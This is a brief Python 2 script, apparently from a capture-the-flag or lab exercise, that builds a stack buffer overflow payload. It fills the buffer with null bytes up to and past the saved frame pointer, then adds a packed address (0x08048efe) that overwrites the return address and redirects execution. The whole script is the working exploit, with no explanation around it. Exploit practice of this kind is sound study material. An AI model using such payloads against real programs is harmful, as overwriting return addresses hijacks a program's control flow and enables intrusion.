from struct import pack
ebp = 0xbffef478
buf = 0xbffef46c
addr = pack("<I", 0x08048efe)

print '\x00' * (ebp - buf + 4) + addr
